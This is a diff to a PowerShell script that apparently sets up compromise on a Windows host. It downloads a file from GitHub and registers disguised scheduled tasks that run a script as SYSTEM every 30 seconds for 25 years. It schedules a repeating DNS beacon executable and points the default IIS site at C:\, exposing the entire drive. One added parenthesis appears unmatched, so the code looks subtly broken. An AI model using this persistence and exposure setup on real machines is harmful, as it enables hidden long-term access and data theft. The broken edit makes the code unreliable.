@@ -16,13 +16,13 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bluefireexplosion/cybe
 $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ExecutionPolicy Bypass -File C:\Windows\System32\bits-service.ps1'
 $TheDate= ([DateTime]::Now)
 $Duration = $TheDate.AddYears(25) -$TheDate
-$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Seconds 30) -RepetitionDuration $Duration
+$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Seconds 30) -RepetitionDuration $Duration)
 $Settings = New-ScheduledTaskSettingsSet
 $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $Task = New-ScheduledTask -Action $Action -Principal $Principal -Trigger $Trigger -Settings $Settings
 Register-ScheduledTask -TaskName "BITS_Transfer_Task" -InputObject $Task
 #Create a DNS task that performs the DNS request to the website every 10 seconds
-Register-ScheduledTask -TaskName "DNS Fun" -Action (New-ScheduledTaskAction -Execute "C:\Windows\System32\dns_request.exe") -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 10) -RepetitionDuration $Duration
+Register-ScheduledTask -TaskName "DNS Fun" -Action (New-ScheduledTaskAction -Execute "C:\Windows\System32\dns_request.exe") -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 10) -RepetitionDuration $Duration)
 #Modify the default IIS site to point to C:\
 Install-WindowsFeature -Name Web-Mgmt-Console, Web-Scripting-Tools
 Set-WebConfiguration -Filter "/system.webServer/sites/site[@name='Default Web Site']/application[@path='/']/virtualDirectory[@path='/']" -Value @{physicalPath='C:\'}
